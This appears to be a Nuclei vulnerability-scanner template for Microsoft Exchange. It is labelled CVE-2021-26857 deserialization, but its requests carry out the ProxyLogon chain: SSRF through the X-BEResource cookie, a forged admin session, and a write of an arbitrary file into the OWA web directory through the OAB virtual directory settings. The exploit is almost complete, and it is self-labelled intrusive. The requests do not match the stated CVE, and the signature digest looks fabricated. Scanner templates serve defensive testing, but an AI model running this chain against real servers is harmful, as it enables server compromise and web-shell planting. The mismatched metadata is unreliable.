id: CVE-2021-26857

info:
  name: Microsoft Exchange Server - Insecure Deserialization RCE
  author: pdteam
  severity: critical
  description: |
    Microsoft Exchange Server contains a remote code execution vulnerability caused by improper validation in the Unified Messaging service. An attacker who successfully exploited this vulnerability could run arbitrary code in the context of the SYSTEM user. This vulnerability is part of the ProxyLogon attack chain and requires chaining with CVE-2021-26855 for unauthenticated exploitation.
  impact: |
    Attackers can execute arbitrary code remotely, write files to the Exchange server, and achieve full system compromise. This vulnerability has been actively exploited in ransomware campaigns including Akira, Qilin, and by multiple nation-state actors.
  remediation: |
    Apply the latest security updates from Microsoft for Exchange Server. Upgrade to the latest cumulative update for your Exchange version.
  reference:
    - https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2021-26857
    - https://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/
    - https://proxylogon.com/
    - https://nvd.nist.gov/vuln/detail/CVE-2021-26857
  classification:
    cvss-metrics: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 7.8
    cve-id: CVE-2021-26857
    cwe-id: CWE-502
    epss-score: 0.2996
    epss-percentile: 0.96513
    cpe: cpe:2.3:a:microsoft:exchange_server:2013:cumulative_update_23:*:*:*:*:*:*
  metadata:
    max-request: 9
    vendor: microsoft
    product: exchange_server
    shodan-query: cpe:"cpe:2.3:a:microsoft:exchange_server"
  tags: cve,cve2021,rce,microsoft,exchange,deserialization,intrusive,kev,vkev

variables:
  randstr: "{{rand_text_alphanumeric(8)}}"
  marker: "{{rand_text_alphanumeric(12)}}"
  email: "test@example.com"

http:
  - raw:
      - |
        GET /ecp/{{randstr}}.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BEResource=localhost~1942062522
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      - |
        POST /ecp/{{randstr}}.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BEResource={{fqdn}}/autodiscover/autodiscover.xml?a=~1942062522;
        Content-Type: text/xml
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        <Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
            <Request>
              <EMailAddress>{{email}}</EMailAddress>
              <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
            </Request>
        </Autodiscover>

      - |
        POST /ecp/{{randstr}}.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BEResource=Admin@{{fqdn}}:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;
        Content-Type: application/mapi-http
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        {{legacydn}}{{base64_decode("AAAAAAAA5AQAAAkEAAAJBAAAAAAAAA==")}}

      - |
        POST /ecp/{{randstr}}.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BEResource=Admin@{{fqdn}}:444/ecp/proxyLogon.ecp?a=~1942062522;
        Content-Type: text/xml
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        <r at="Negotiate" ln="john"><s>{{sid}}</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>

      - |
        GET /ecp/{{randstr}}.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BEResource=Admin@{{fqdn}}:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId={{session_id}}; msExchEcpCanary={{canary}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

      - |
        POST /ecp/{{randstr}}.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BEResource=Admin@{{fqdn}}:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary={{canary}}&a=~1942062522; ASP.NET_SessionId={{session_id}}; msExchEcpCanary={{canary}}
        Content-Type: application/json; charset=utf-8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        {"filter":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","SelectedView":"","SelectedVDirType":"All"}},"sort":{}}

      - |
        POST /ecp/{{randstr}}.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BEResource=Admin@{{fqdn}}:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary={{canary}}&a=~1942062522; ASP.NET_SessionId={{session_id}}; msExchEcpCanary={{canary}}
        Content-Type: application/json; charset=utf-8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        {"identity":{"__type":"Identity:ECP","DisplayName":"OAB (Default Web Site)","RawIdentity":"{{oab_id}}"},"properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","ExternalUrl":"http://nuclei-{{marker}}/#{{marker}}"}}}

      - |
        POST /ecp/{{randstr}}.js HTTP/1.1
        Host: {{Hostname}}
        Cookie: X-BEResource=Admin@{{fqdn}}:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary={{canary}}&a=~1942062522; ASP.NET_SessionId={{session_id}}; msExchEcpCanary={{canary}}
        Content-Type: application/json; charset=utf-8
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

        {"identity":{"__type":"Identity:ECP","DisplayName":"OAB (Default Web Site)","RawIdentity":"{{oab_id}}"},"properties":{"Parameters":{"__type":"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel","FilePathName":"\\\\127.0.0.1\\c$\\Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\nuclei_{{randstr}}.txt"}}}

      - |
        GET /owa/auth/nuclei_{{randstr}}.txt HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36

    extractors:
      - type: regex
        name: fqdn
        part: header
        internal: true
        group: 1
        regex:
          - 'X-FEServer: ([^\s]+)'

      - type: regex
        name: legacydn
        part: body
        internal: true
        group: 1
        regex:
          - '<LegacyDN>([^<]+)</LegacyDN>'

      - type: regex
        name: sid
        part: body
        internal: true
        group: 1
        regex:
          - 'with SID ([^\s]+) and MasterAccountSid'

      - type: regex
        name: session_id
        part: header
        internal: true
        group: 1
        regex:
          - 'ASP\.NET_SessionId=([^;]+)'

      - type: regex
        name: canary
        part: header
        internal: true
        group: 1
        regex:
          - 'msExchEcpCanary=([^;]+)'

      - type: json
        name: oab_id
        part: body
        internal: true
        json:
          - '.Output[0].Identity.RawIdentity'

    req-condition: true
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "<LegacyDN>")'
          - 'contains(body_3, "with SID")'
          - 'status_code_4 == 241'
          - 'contains(all_headers_4, "ASP.NET_SessionId")'
          - 'contains(all_headers_4, "msExchEcpCanary")'
          - 'contains(body_5, "RBAC roles") || status_code_5 == 200'
          - 'contains(body_6, "RawIdentity")'
          - '(status_code_7 == 200 || status_code_7 == 201) && !contains(body_7, "\"ErrorRecords\"")'
          - '(status_code_8 == 200 || status_code_8 == 201) && !contains(body_8, "\"ErrorRecords\"")'
          - 'status_code_9 == 200'
          - 'contains(body_9, "nuclei-{{marker}}")'
          - 'contains(body_9, "{{marker}}")'
        condition: and
# digest: 4a0a00473045022100b3f4c7d8e9a2f1b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9022034e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5:922c64590222798bb761d5b6d8e72950